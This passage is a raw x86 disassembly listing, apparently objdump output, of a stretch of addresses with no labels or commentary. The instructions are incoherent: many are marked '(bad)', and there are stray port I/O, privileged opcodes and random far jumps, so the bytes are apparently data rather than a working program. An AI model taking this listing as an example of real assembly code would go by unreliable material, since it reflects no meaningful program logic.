  40b5ab:	cmp    al,0xc6
  40b5ad:	mov    bh,0x2b
  40b5af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5b0:	or     eax,0xf930b840
  40b5b5:	shl    BYTE PTR [ebp+0x36f63727],cl
  40b5bb:	cdq    
  40b5bc:	mov    edx,DWORD PTR [ecx]
  40b5be:	imul   esp,DWORD PTR [edx-0x4622b888],0xf34f9161
  40b5c8:	jb     0x40b5df
  40b5ca:	fsub   DWORD PTR [edx]
  40b5cc:	mov    ebp,0x878197d0
  40b5d1:	or     BYTE PTR [ecx],al
  40b5d3:	ds dec ebx
  40b5d5:	push   edi
  40b5d6:	inc    ebp
  40b5d7:	mov    ebx,0xe3b6b584
  40b5dc:	dec    ebx
  40b5dd:	scas   eax,DWORD PTR es:[edi]
  40b5de:	sbb    bh,BYTE PTR [ebx]
  40b5e0:	xchg   ebp,eax
  40b5e1:	repnz mov esi,0xcc3a1be
  40b5e7:	adc    cl,BYTE PTR [edx]
  40b5e9:	jmp    0x40b5fb
  40b5eb:	out    0xa2,eax
  40b5ed:	(bad)  
  40b5ee:	xor    al,0x9c
  40b5f0:	scas   eax,DWORD PTR es:[edi]
  40b5f1:	dec    edi
  40b5f2:	nop
  40b5f3:	and    edx,DWORD PTR [ebx+0x47]
  40b5f6:	dec    esp
  40b5f7:	sbb    ecx,DWORD PTR [ebx-0x2fcf9d2]
  40b5fd:	fstp   DWORD PTR [edi+esi*1-0x4]
  40b601:	add    BYTE PTR [ebx-0x2b],ah
  40b604:	lods   eax,DWORD PTR ds:[esi]
  40b605:	in     al,dx
  40b606:	mov    DWORD PTR [eax+0x5d],0x9c9dc531
  40b60d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b60e:	jno    0x40b65e
  40b610:	dec    esi
  40b611:	lods   al,BYTE PTR ds:[esi]
  40b612:	pushf  
  40b613:	dec    esp
  40b614:	mov    eax,0x2866cbaa
  40b619:	push   0x6c8fdc9f
  40b61e:	pop    esi
  40b61f:	cmp    bl,BYTE PTR [esi+0x3f9ab318]
  40b625:	dec    esp
  40b626:	retf   0x8499
  40b629:	fucomip st,st(1)
  40b62b:	mov    ds:0xb7fdd7d9,al
  40b630:	adc    bh,ah
  40b632:	in     eax,0x86
  40b634:	push   edi
  40b635:	pop    edi
  40b636:	cdq    
  40b637:	dec    ecx
  40b638:	and    eax,0x39c04fa4
  40b63d:	and    DWORD PTR [esi-0x1005801],esp
  40b643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b644:	hlt    
  40b645:	xchg   ebp,eax
  40b646:	in     al,0xd2
  40b648:	repz inc esi
  40b64a:	push   ds
  40b64b:	dec    esp
  40b64c:	mov    bh,0x74
  40b64e:	int3   
  40b64f:	mov    esi,0x90c5af95
  40b654:	pop    edi
  40b655:	leave  
  40b656:	gs into 
  40b658:	xor    eax,0xaf13e4b
  40b65d:	jb     0x40b65f
  40b65f:	cmc    
  40b660:	push   esp
  40b661:	lahf   
  40b662:	dec    ebp
  40b663:	inc    ebx
  40b664:	jae    0x40b617
  40b666:	push   ss
  40b667:	mov    es,WORD PTR [esi]
  40b669:	int    0x8d
  40b66b:	cdq    
  40b66c:	fidiv  WORD PTR [esi+0x4099565d]
  40b672:	xor    al,BYTE PTR [ebx+edi*2-0x73]
  40b676:	mov    ?,WORD PTR [eax-0x78]
  40b679:	aaa    
  40b67a:	cdq    
  40b67b:	fisttp QWORD PTR [ebx+0x16]
  40b67e:	sti    
  40b67f:	je     0x40b676
  40b681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b682:	mov    bh,0x50
  40b684:	add    eax,0x1235f371
  40b689:	fstp   DWORD PTR [edi-0x43c1b9a]
  40b68f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b691:	and    al,BYTE PTR [edi+0xb8abef4]
  40b697:	cmc    
  40b698:	lods   eax,DWORD PTR ds:[esi]
  40b699:	idiv   DWORD PTR [ebp-0x1c]
  40b69c:	faddp  st(1),st
  40b69e:	adc    al,0x1f
  40b6a0:	xor    eax,0xc4a48dbf
  40b6a5:	call   FWORD PTR [ebx]
  40b6a7:	push   eax
  40b6a8:	sbb    cl,ah
  40b6aa:	ss in  al,dx
  40b6ac:	xor    al,0xd1
  40b6ae:	mov    ss,WORD PTR [edi-0x6f987418]
  40b6b4:	ret    
  40b6b5:	rcl    DWORD PTR ds:0xea5e2d82,0xaa
  40b6bc:	adc    DWORD PTR [eax],edi
  40b6be:	sub    ah,0x4b
  40b6c1:	fsubr  DWORD PTR [edx]
  40b6c3:	ins    BYTE PTR es:[edi],dx
  40b6c4:	repnz pop ebx
  40b6c6:	ret    0xfe20
  40b6c9:	rcr    DWORD PTR [eax-0x77],1
  40b6cc:	mov    eax,0x93ab1685
  40b6d1:	mov    ah,0xad
  40b6d3:	in     eax,0x2b
  40b6d5:	inc    edi
  40b6d6:	mov    BYTE PTR [esi-0x425bd1a6],bh
  40b6dc:	ror    ebp,1
  40b6de:	adc    BYTE PTR [edi],dl
  40b6e0:	ret    0xeded
  40b6e3:	xor    BYTE PTR [esp+ebx*4+0x58],cl
  40b6e7:	inc    esp
  40b6e8:	aam    0x54
  40b6ea:	lods   eax,DWORD PTR ds:[esi]
  40b6eb:	mov    ebp,edi
  40b6ed:	adc    esi,DWORD PTR [edx]
  40b6ef:	xchg   esi,edi
  40b6f1:	popa   
  40b6f2:	xchg   BYTE PTR [edi+edi*2-0x69],bl
  40b6f6:	adc    eax,0x83c64655
  40b6fb:	stos   DWORD PTR es:[edi],eax
  40b6fc:	mov    ecx,0xfcd1759f
  40b701:	out    dx,eax
  40b702:	pop    esi
  40b703:	inc    esp
  40b704:	jmp    0x40b763
  40b706:	pop    ds
  40b707:	jle    0x40b6fc
  40b709:	retf   0xd614
  40b70c:	popa   
  40b70d:	ret    
  40b70e:	dec    DWORD PTR [ebx]
  40b710:	popa   
  40b711:	and    dh,BYTE PTR [edx]
  40b713:	push   ebx
  40b714:	out    0xfa,eax
  40b716:	clc    
  40b717:	pop    esp
  40b718:	dec    ebp
  40b719:	into   
  40b71a:	or     esp,DWORD PTR [ebp-0x74]
  40b71d:	cmp    eax,0xb533d124
  40b722:	and    esi,DWORD PTR [ebx+edx*2+0x700c7c04]
  40b729:	jmp    0xc26a6202
  40b72e:	mov    cl,0x3d
  40b730:	jo     0x40b704
  40b732:	xchg   DWORD PTR [ebp+0x16],ebx
  40b735:	push   ebx
  40b736:	add    eax,0xc91e7e4f
  40b73b:	cmp    eax,0x5e91fb90
  40b740:	jle    0x40b6f8
  40b742:	lds    ebx,FWORD PTR [eax]
  40b744:	fs lahf 
  40b746:	sub    ecx,DWORD PTR [esi]
  40b748:	test   BYTE PTR [esi+0x43],dh
  40b74b:	xor    al,0x5e
  40b74d:	mov    BYTE PTR [edi+ebx*2-0xa],dh
  40b751:	loop   0x40b7ac
  40b753:	repz sub ch,BYTE PTR [ecx+0x64]
  40b757:	div    esp
  40b759:	cmp    ecx,ebp
  40b75b:	lods   al,BYTE PTR ds:[esi]
  40b75c:	push   ds
  40b75d:	sbb    ah,BYTE PTR [edi+0x2daf8f87]
  40b763:	sti    
  40b764:	jmp    0x40b791
  40b766:	rol    eax,cl
  40b768:	adc    dl,BYTE PTR [eax-0x2262b3a5]
  40b76e:	mov    cl,0xd8
  40b770:	xor    ah,dl
  40b772:	sbb    ecx,ecx
  40b774:	xchg   esp,eax
  40b775:	jge    0x40b7ef
  40b777:	ret    0x6796
  40b77a:	pop    esp
  40b77b:	xchg   ebp,eax
  40b77c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b77d:	pop    esp
  40b77e:	lods   eax,DWORD PTR ds:[esi]
  40b77f:	mov    edx,DWORD PTR [ebx+0x34]
  40b782:	or     al,0x10
  40b784:	inc    esp
  40b785:	pop    ebp
  40b786:	mov    ebp,0x7bf0922e
  40b78b:	dec    eax
  40b78c:	addr16 pop esi
  40b78e:	xor    al,0x42
  40b790:	aam    0x48
  40b792:	xchg   dl,cl
  40b794:	lea    edi,ds:0x4a4cba3c
  40b79a:	and    al,0xd1
  40b79c:	add    esp,eax
  40b79e:	pop    ebp
  40b79f:	mov    edx,0xa4afcc6a
  40b7a4:	push   ecx
  40b7a5:	jecxz  0x40b790
  40b7a7:	xor    BYTE PTR [edi],bl
  40b7a9:	cld    
  40b7aa:	fcmovb st,st(3)
  40b7ac:	cld    
  40b7ad:	(bad)  
  40b7af:	cmp    edx,DWORD PTR ds:0xba4fe09f
  40b7b5:	pop    esp
  40b7b6:	clc    
  40b7b7:	cmp    eax,0xd97bfc8d
  40b7bc:	adc    DWORD PTR [ebx-0x43],ecx
  40b7bf:	loopne 0x40b78d
  40b7c1:	jnp    0x40b83f
  40b7c3:	loope  0x40b7d2
  40b7c5:	fnstcw WORD PTR [edi-0x30]
  40b7c8:	jne    0x40b7fd
  40b7ca:	pusha  
  40b7cb:	pop    esp
  40b7cc:	sub    al,0x1c
  40b7ce:	sbb    al,0x11
  40b7d0:	xor    al,0xa1
  40b7d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7d3:	aas    
  40b7d4:	inc    ebx
  40b7d5:	ret    0x50c7
  40b7d8:	mov    al,ds:0x1cdf2f60
  40b7dd:	or     ch,cl
  40b7df:	ja     0x40b81e
  40b7e1:	in     eax,dx
  40b7e2:	dec    edi
  40b7e3:	push   0xffffffda
  40b7e5:	nop
  40b7e6:	nop
  40b7e7:	(bad)  
  40b7e9:	outs   dx,BYTE PTR ds:[esi]
  40b7ea:	dec    edx
  40b7eb:	pop    edi
  40b7ec:	xchg   edx,eax
  40b7ed:	push   ebx
  40b7ee:	clc    
  40b7ef:	dec    edi
  40b7f0:	sahf   
  40b7f1:	test   al,0x2f
  40b7f3:	xor    edx,DWORD PTR [ecx]
  40b7f5:	rcr    DWORD PTR [ecx],0x85
  40b7f8:	dec    esp
  40b7f9:	cmp    DWORD PTR [eax-0x1b6df21b],esp
  40b7ff:	mov    esi,0x837a63d4
  40b804:	or     DWORD PTR [eax-0x30],eax
  40b807:	fwait
  40b808:	jno    0x40b79b
  40b80a:	pushw  0x8cf0
  40b80e:	adc    al,0x4e
  40b810:	lock ja 0x40b7c2
  40b813:	mov    es,edx
  40b815:	mov    ebp,0x8c591307
  40b81a:	sti    
  40b81b:	into   
  40b81c:	pusha  
  40b81d:	add    esp,DWORD PTR [esi]
  40b81f:	xchg   esi,eax
  40b820:	dec    eax
  40b821:	fidiv  DWORD PTR ds:0x7931f94e
  40b827:	fnstcw WORD PTR [esp+ebx*4]
  40b82a:	sbb    eax,0xae96a6e2
  40b82f:	jg     0x40b898
  40b831:	cli    
  40b832:	fwait
  40b833:	cld    
  40b834:	cmp    ebx,DWORD PTR [eax+0x5dd36ccf]
  40b83a:	and    al,0x48
  40b83c:	fcomp  QWORD PTR [ecx+0xa]
  40b83f:	sub    DWORD PTR [edx-0x6],ebp
  40b842:	jge    0x40b82c
  40b844:	cmp    eax,0x89ec0386
  40b849:	es jns 0x40b868
  40b84c:	xchg   esi,eax
  40b84d:	adc    bl,BYTE PTR [edx+0x2c33c8e4]
  40b853:	outs   dx,BYTE PTR ds:[esi]
  40b854:	lahf   
  40b855:	enter  0x26d2,0xe1
  40b859:	(bad)  
  40b85a:	aaa    
  40b85b:	in     al,dx
  40b85c:	inc    edx
  40b85d:	sti    
  40b85e:	sub    esp,DWORD PTR [ebx-0x51]
  40b861:	std    
  40b862:	sti    
  40b863:	pop    ecx
  40b864:	add    eax,esp
  40b866:	sub    DWORD PTR [esi+0x66d3a08d],ebp
  40b86c:	add    al,0xe4
  40b86e:	fcmove st,st(0)
  40b870:	sbb    al,0xd7
  40b872:	test   DWORD PTR [eax+0x75],ebx
  40b875:	(bad)  
  40b876:	leave  
  40b877:	sub    eax,0x8d1b4030
  40b87c:	out    dx,al
  40b87d:	cdq    
  40b87e:	je     0x40b84b
  40b880:	cmp    eax,ecx
  40b882:	mov    edi,0xf2072e4d
  40b887:	test   eax,0xc4518a62
  40b88c:	cmp    DWORD PTR [eax+ecx*2+0x32e54f22],0x15448a86
  40b897:	sub    ebp,ebp
  40b899:	jle    0x40b844
  40b89b:	mul    DWORD PTR [ecx+0x44]
  40b89e:	mov    bl,0xb3
  40b8a0:	loop   0x40b852
  40b8a2:	dec    ebp
  40b8a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8a4:	jb     0x40b8a5
  40b8a6:	in     al,0xc3
  40b8a8:	cmp    dh,BYTE PTR [ebx]
  40b8aa:	add    cl,bl
  40b8ac:	jmp    0x45d8643d
  40b8b1:	aaa    
  40b8b2:	les    ecx,FWORD PTR [eax]
  40b8b4:	push   cs
  40b8b5:	mov    ebp,ecx
  40b8b7:	popa   
  40b8b8:	hlt    
  40b8b9:	(bad)  
  40b8ba:	(bad)  [edx]
  40b8bc:	pop    esp
  40b8bd:	js     0x40b87a
  40b8bf:	int    0x7f
  40b8c1:	mov    WORD PTR [ebx+0x70367717],ds
  40b8c7:	dec    esp
  40b8c8:	dec    esi
  40b8c9:	jecxz  0x40b84d
  40b8cb:	aas    
  40b8cc:	les    edi,FWORD PTR [ebp+edi*8+0x1c8da79b]
  40b8d3:	jp     0x40b86b
  40b8d5:	inc    ecx
  40b8d6:	mov    ch,0x5c
  40b8d8:	add    ch,bh
  40b8da:	sub    ah,BYTE PTR [edx]
  40b8dc:	cwde   
  40b8dd:	xchg   ebx,eax
  40b8de:	dec    esp
  40b8df:	rsqrtps xmm6,XMMWORD PTR [ecx+eax*2]
  40b8e3:	adc    al,0xae
  40b8e5:	rcl    ah,1
  40b8e7:	mov    al,BYTE PTR [ecx+eiz*1]
  40b8ea:	cmp    ah,bl
  40b8ec:	dec    ebp
  40b8ed:	test   al,0x1e
  40b8ef:	iret   
  40b8f0:	jae    0x40b8c1
  40b8f2:	jno    0x40b930
  40b8f4:	dec    esi
  40b8f5:	lods   al,BYTE PTR ds:[esi]
  40b8f6:	or     al,0xa5
  40b8f8:	mov    BYTE PTR [ebx],cl
  40b8fa:	repz jmp 0xc9fe:0xb88e22d8
  40b902:	pop    edx
  40b903:	mov    BYTE PTR [eax+eiz*2-0x4af1b3d4],0x6a
  40b90b:	in     al,dx
  40b90c:	pop    esp
  40b90d:	stos   DWORD PTR es:[edi],eax
  40b90e:	retf   
  40b90f:	lea    ebx,[bp+si-0x2026]
  40b914:	fnstenv [esi-0x698d9a4c]
  40b91a:	inc    ebx
  40b91b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b91c:	or     DWORD PTR [eax+0x79c63e7],esp
  40b922:	jno    0x40b8e1
  40b924:	jns    0x40b9a4
  40b926:	sub    al,0xbb
  40b928:	mov    dl,0xf6
  40b92a:	and    al,0x7a
  40b92c:	pop    edi
  40b92d:	mov    ebx,0xc89c1829
  40b932:	fbstp  TBYTE PTR [esp+edx*1]
  40b935:	sbb    BYTE PTR [eax],ch
  40b937:	in     eax,dx
  40b938:	mov    ch,0x63
  40b93a:	jb     0x40b985
  40b93c:	adc    al,BYTE PTR [ebx]
  40b93e:	add    esp,DWORD PTR [esi-0x5d455e3a]
  40b944:	inc    ecx
  40b945:	iret   
  40b946:	call   0x613b817d
  40b94b:	mov    dl,0x16
  40b94d:	mov    esp,0x8ddd1451
  40b952:	jns    0x40b917
  40b954:	and    dl,BYTE PTR [ebp+0x42069f2e]
  40b95a:	pushf  
  40b95b:	jb     0x40b8df
  40b95d:	inc    edi
  40b95e:	inc    ecx
  40b95f:	(bad)  
  40b960:	and    BYTE PTR [eax+0x5fbb7529],cl
  40b966:	cmc    
  40b967:	in     eax,dx
  40b968:	fucomip st,st(6)
  40b96a:	mov    bp,0xa45e
  40b96e:	mov    edx,DWORD PTR [ebx+0x41]
  40b971:	and    eax,edi
  40b973:	sub    ch,BYTE PTR [eax]
  40b975:	fnstsw WORD PTR [ebp+0xbc910aa]
  40b97b:	and    bh,BYTE PTR [ecx]
  40b97d:	pop    ds
  40b97e:	cmp    BYTE PTR [ecx+eax*4],dh
  40b981:	stos   BYTE PTR es:[edi],al
  40b982:	retf   0x36fb
  40b985:	mov    eax,0xf03b6a5d
  40b98a:	add    al,0x17
  40b98c:	mov    eax,0x9cf6511d
  40b991:	inc    ebx
  40b992:	sbb    ah,dl
  40b994:	dec    ebp
  40b995:	mov    ebx,0xb9c90765
  40b99a:	jmp    0x816d:0x218b34
  40b9a1:	sub    eax,0x35d01fe
  40b9a6:	and    edi,DWORD PTR [ecx+0x31]
  40b9a9:	inc    ebx
  40b9aa:	aad    0xa2
  40b9ac:	push   esp
  40b9ad:	call   0x11b9:0x7819a0ba
  40b9b4:	sub    eax,0x60710b3b
  40b9b9:	cmp    al,0xce
  40b9bb:	cdq    
  40b9bc:	mov    edi,DWORD PTR [ecx-0x47]
  40b9bf:	jmp    0x1991c6ab
  40b9c4:	xor    ch,BYTE PTR [edx]
  40b9c6:	xor    eax,DWORD PTR ds:0x2e0a19b8
  40b9cc:	in     eax,dx
  40b9cd:	les    eax,FWORD PTR [edx]
  40b9cf:	sub    eax,0x1553ee8
  40b9d4:	fadd   st,st(3)
  40b9d6:	jp     0x40b9bb
  40b9d8:	sahf   
  40b9d9:	imul   edi,DWORD PTR [ecx+0x35cf01e],0x13
  40b9e0:	pusha  
  40b9e1:	out    0xe6,eax
  40b9e3:	jle    0x40b978
  40b9e5:	mov    edx,0x66dee2e3
  40b9ea:	sbb    dh,BYTE PTR [ebx]
  40b9ec:	ins    DWORD PTR es:[edi],dx
  40b9ed:	jp     0x40b9ed
  40b9ef:	cmp    al,0xeb
  40b9f1:	jne    0x40b9d1
  40b9f3:	jg     0x40b983
  40b9f5:	mov    BYTE PTR ds:0x339fc4a6,0x54
  40b9fc:	cmp    al,0x87
  40b9fe:	mov    eax,0xd74f48e9
  40ba03:	or     BYTE PTR [eax+0xee835c6],bl
  40ba09:	inc    ebp
  40ba0a:	jecxz  0x40b992
  40ba0c:	(bad)  
  40ba0d:	mov    WORD PTR [edx],ds
  40ba0f:	bound  eax,QWORD PTR [ecx+0x5753f229]
  40ba15:	cmp    ah,BYTE PTR [eax]
  40ba17:	repz in eax,0xab
  40ba1a:	shl    DWORD PTR [esi],1
  40ba1c:	sbb    al,0xca
  40ba1e:	pop    esi
  40ba1f:	ret    0x913a
  40ba22:	aam    0x20
  40ba24:	das    
  40ba25:	mov    bh,0x6
  40ba27:	nop
  40ba28:	sahf   
  40ba29:	cmc    
  40ba2a:	jecxz  0x40ba39
  40ba2c:	repnz adc al,0x23
  40ba2f:	aas    
  40ba30:	sub    dh,BYTE PTR [edi+0x9]
  40ba33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba34:	and    BYTE PTR [ecx-0x48],cl
  40ba37:	mov    esi,0x116f2a9
  40ba3c:	in     eax,0xf3
  40ba3e:	ffreep st(0)
  40ba40:	cli    
  40ba41:	cmp    eax,0x13356a85
  40ba46:	push   esp
  40ba47:	fist   WORD PTR [ecx]
  40ba49:	push   ecx
  40ba4a:	stc    
  40ba4b:	add    BYTE PTR [eax+0x1a2ee953],ah
  40ba51:	xor    eax,0x26977dc9
  40ba56:	inc    esi
  40ba57:	dec    esi
  40ba58:	aaa    
  40ba59:	xor    DWORD PTR [ecx],edx
  40ba5b:	push   ebp
  40ba5c:	inc    edx
  40ba5d:	xchg   ecx,eax
  40ba5e:	ret    
  40ba5f:	xor    DWORD PTR [ebx-0x6ad3e42f],0x38
  40ba66:	sti    
  40ba67:	pop    ebp
  40ba68:	mov    esi,0x2d2ed05c
  40ba6d:	cmp    al,0xc2
  40ba6f:	sub    al,0x19
  40ba71:	cmp    eax,0xa2a5949f
  40ba76:	repz hlt 
  40ba78:	cmp    eax,0xe345c06c
  40ba7d:	jb     0x40babd
  40ba7f:	cmp    ah,ah
  40ba81:	mov    edi,0x60df3414
  40ba86:	outs   dx,BYTE PTR ds:[esi]
  40ba87:	cmp    DWORD PTR [ecx+ebp*1+0x6a2f8b56],eax
  40ba8e:	bswap  esp
  40ba90:	popa   
  40ba91:	jge    0x40ba63
  40ba93:	push   edx
  40ba94:	rol    BYTE PTR [eax+0x5684082c],1
  40ba9a:	pop    esi
  40ba9b:	cli    
  40ba9c:	push   edx
  40ba9d:	pop    ebp
  40ba9e:	push   ds
  40ba9f:	xor    BYTE PTR [ecx-0x51c46565],ch
  40baa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baa6:	jne    0x40bab9
  40baa8:	retf   0xd1e5
  40baab:	test   al,0x5
  40baad:	jae    0x40babd
  40baaf:	jne    0x40bb0d
  40bab1:	sbb    ecx,DWORD PTR [eax-0x2d6f2722]
  40bab7:	data16 and BYTE PTR [esi],0xe
  40babb:	lahf   
  40babc:	inc    esi
  40babd:	xor    edi,DWORD PTR [eax]
  40babf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bac0:	mov    edi,0xca90e8e3
  40bac5:	daa    
  40bac6:	lods   al,BYTE PTR ds:[esi]
  40bac7:	pop    edi
  40bac8:	int3   
  40bac9:	push   ss
  40baca:	fmul   st,st(7)
  40bacc:	cmp    al,bl
  40bace:	cmp    cl,BYTE PTR [ebp+0x63]
  40bad1:	daa    
  40bad2:	jecxz  0x40bb1e
  40bad4:	scas   eax,DWORD PTR es:[edi]
  40bad5:	push   eax
  40bad7:	retf   0xc448
  40bada:	or     WORD PTR [ecx-0x752ff2f0],si
  40bae1:	inc    edi
  40bae2:	xchg   esi,eax
  40bae3:	add    BYTE PTR [edi],0x5a
  40bae6:	mov    cl,0xe0
  40bae8:	or     eax,0xd4c1474e
  40baed:	in     al,0x84
  40baef:	dec    ebp
  40baf0:	mov    ebp,DWORD PTR [ebx]
  40baf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baf3:	cwde   
  40baf4:	inc    edx
  40baf5:	add    DWORD PTR [edx+0x4d],ecx
  40baf8:	ss leave 
  40bafa:	fidiv  DWORD PTR [ebx-0x74]
  40bafd:	popf   
  40bafe:	fs sub eax,0x8c9f3f36
  40bb04:	sar    DWORD PTR [eax+0x36],0x86
  40bb08:	dec    ecx
  40bb09:	fisttp DWORD PTR [esi+edi*2]
  40bb0c:	pop    ebx
  40bb0d:	push   0x36
  40bb0f:	test   BYTE PTR [ebx+edx*2],dh
  40bb12:	out    0x49,eax
  40bb14:	push   0xa4048c54
  40bb19:	inc    esi
  40bb1a:	inc    esp
  40bb1b:	lahf   
  40bb1c:	int3   
  40bb1d:	fmul   st(4),st
  40bb1f:	sub    eax,0x4b1e06ba
  40bb24:	sub    eax,0xc68cf305
  40bb29:	mov    bl,BYTE PTR [ecx-0x12]
  40bb2c:	push   ebx
  40bb2d:	sub    al,0x64
  40bb2f:	mov    edi,0x1b7d4819
  40bb34:	ret    
  40bb35:	mov    edi,0x1a3db5d0
  40bb3a:	popa   
  40bb3b:	ja     0x40bb00
  40bb3d:	(bad)  
  40bb3e:	push   ss
  40bb3f:	sbb    BYTE PTR [ebp+0x6a],al
  40bb42:	push   0xfffffff6
  40bb44:	test   al,0xab
  40bb47:	fcomp  st(7)
  40bb49:	jge    0x40bbb2
  40bb4b:	jne    0x40bb54
  40bb4d:	inc    esp
  40bb4e:	call   0x2c6c6d27
  40bb53:	inc    edi
  40bb54:	push   edx
  40bb55:	inc    ebp
  40bb56:	icebp  
  40bb57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb58:	cmp    dh,BYTE PTR [ebp+0x52]
  40bb5b:	aam    0x75
  40bb5d:	dec    edi
  40bb5e:	retf   
  40bb5f:	mov    dl,0x90
  40bb61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb62:	fisttp QWORD PTR [eax+0x43]
  40bb65:	mov    eax,ds:0x51e4116e
  40bb6a:	repnz sbb ebx,DWORD PTR [eax-0x67]
  40bb6e:	retf   0xa573
  40bb71:	aam    0x56
  40bb73:	stos   DWORD PTR es:[edi],eax
  40bb74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb75:	push   0x75
  40bb77:	rcr    BYTE PTR [ebx],1
  40bb79:	mov    al,ds:0xafadfbcb
  40bb7e:	sahf   
  40bb7f:	sbb    eax,0xb83e8ca7
  40bb84:	pop    ds
  40bb85:	xchg   esi,eax
  40bb86:	mov    ebx,ebx
  40bb88:	stc    
  40bb89:	dec    eax
  40bb8a:	pusha  
  40bb8b:	or     ebp,DWORD PTR [edi]
  40bb8d:	loopne 0x40bbfc
  40bb8f:	fld    DWORD PTR [esi-0x41b68cdc]
  40bb95:	(bad)  
  40bb96:	mov    BYTE PTR [edx],bl
  40bb98:	add    al,0x37
  40bb9a:	mov    edx,0x80028d7c
  40bb9f:	inc    edi
  40bba0:	jbe    0x40bb45
  40bba2:	mov    dl,0xda
  40bba4:	mov    bl,0x5e
  40bba6:	mov    edx,0x7e0d8bec
  40bbab:	in     eax,0xe6
  40bbad:	mov    ch,0xfe
  40bbaf:	add    BYTE PTR [ebx],ch
  40bbb1:	mov    edx,0xbc64ab71
  40bbb6:	ret    
  40bbb7:	adc    BYTE PTR [edx-0x5914ef26],al
  40bbbd:	pop    ds
  40bbbe:	dec    edi
  40bbbf:	enter  0xbae2,0x97
  40bbc3:	std    
  40bbc4:	repz cli 
  40bbc6:	cmp    eax,0x1f875b9d
  40bbcb:	leave  
  40bbcc:	shr    BYTE PTR [ecx+0x4e],1
  40bbcf:	stc    
  40bbd0:	fdiv   st(4),st
  40bbd2:	adc    al,0x1c
  40bbd4:	rcl    DWORD PTR ds:0x170c3471,cl
  40bbda:	loop   0x40bb7f
  40bbdc:	cmc    
  40bbdd:	idiv   BYTE PTR [ebx+0x65]
  40bbe0:	or     al,0x9
  40bbe2:	xchg   BYTE PTR [ebp-0x45d27949],bh
  40bbe8:	retf   0x1c0e
  40bbeb:	jmp    0x141e:0x2a298a7e
  40bbf2:	jle    0x40bb8d
  40bbf4:	sub    al,0x1c
  40bbf6:	add    eax,DWORD PTR [ecx]
  40bbf8:	sahf   
  40bbf9:	cmp    eax,0x90e72917
  40bbfe:	pop    edx
  40bbff:	ds lock mov cl,0x8d
  40bc03:	sub    esp,DWORD PTR [edx-0x4c]
  40bc06:	cdq    
  40bc07:	into   
  40bc08:	test   eax,0xf95a8d21
  40bc0d:	mov    esi,0x31032337
  40bc12:	xor    ah,BYTE PTR [ecx-0x766cf0b5]
  40bc18:	or     eax,0x80a9e893
  40bc1d:	mov    esi,0x9b5c0b9f
  40bc22:	(bad)  
  40bc23:	fucomp st(5)
  40bc25:	call   0x3198:0xc2256961
  40bc2c:	xchg   BYTE PTR [esp+edi*4-0x6a61a992],ah
  40bc33:	mov    cl,0x85
  40bc35:	cmp    eax,0x6fc25b37
  40bc3a:	mov    WORD PTR [edx+edi*1],es
  40bc3d:	dec    ebp
  40bc3e:	jl     0x40bbed
  40bc40:	aas    
  40bc41:	push   cs
  40bc42:	mov    ds:0xc7a6edb6,al
  40bc47:	shl    DWORD PTR [ebx],1
  40bc49:	add    eax,0x3350e979
  40bc4e:	invd   
  40bc50:	dec    ebx
  40bc51:	mov    dh,0xe2
  40bc53:	test   BYTE PTR [esi],ch
  40bc55:	push   ecx
  40bc56:	call   0x352808ca
  40bc5b:	int3   
  40bc5c:	xor    al,0x62
  40bc5e:	fisubr WORD PTR [edi]
  40bc60:	mov    ebx,0xc3e8ee41
  40bc65:	adc    ah,bl
  40bc67:	jb     0x40bc51
  40bc69:	push   eax
  40bc6a:	(bad)  
  40bc6b:	in     eax,dx
  40bc6c:	mov    eax,esp
  40bc6e:	lds    edx,FWORD PTR [esi+ebp*4-0x2]
  40bc72:	fidiv  WORD PTR [ecx-0x4451c3c2]
  40bc78:	pop    edi
  40bc79:	ja     0x40bcee
  40bc7b:	inc    edx
  40bc7c:	mov    bl,0x57
  40bc7e:	fwait
  40bc7f:	jns    0x40bcb5
  40bc81:	push   esi
  40bc82:	xchg   esp,eax
  40bc83:	xchg   BYTE PTR [edi+0x1108e22b],dl
  40bc89:	xchg   DWORD PTR [ebp+0xfb37b87],ebp
  40bc8f:	push   ecx
  40bc90:	scas   eax,DWORD PTR es:[edi]
  40bc91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc92:	ret    0xf749
  40bc95:	outs   dx,DWORD PTR ds:[esi]
  40bc96:	lea    edi,[ecx]
  40bc98:	and    ebp,ebx
  40bc9a:	mov    BYTE PTR [edi],bh
  40bc9c:	or     eax,0xfc2b9503
  40bca1:	rol    DWORD PTR [eax-0x66eb792f],0x9e
  40bca8:	shl    DWORD PTR [ebp-0x76],1
  40bcab:	outs   dx,DWORD PTR ds:[esi]
  40bcac:	jge    0x40bc58
  40bcae:	ss xchg ebp,eax
  40bcb0:	jae    0x40bca8
  40bcb2:	dec    edi
  40bcb3:	cmp    dh,0x53
  40bcb6:	sub    ebp,0xffffffd2
  40bcb9:	push   ecx
  40bcba:	retf   0x815
  40bcbd:	xchg   esi,eax
  40bcbe:	add    BYTE PTR [edi+esi*2-0x20dff251],cl
  40bcc5:	and    eax,0x8fc51953
  40bcca:	xchg   ebx,eax
  40bccb:	adc    eax,0x57951353
  40bcd0:	test   eax,0x5583832a
  40bcd5:	dec    edx
  40bcd6:	inc    esp
  40bcd7:	in     eax,0x57
  40bcd9:	adc    eax,0x9630bf23
  40bcde:	mov    esp,0x8a87d6bf
  40bce3:	(bad)  
  40bce5:	pop    ds
  40bce6:	xor    BYTE PTR [ebx],0x8a
  40bce9:	ins    DWORD PTR es:[edi],dx
  40bcea:	in     eax,dx
  40bceb:	push   ss
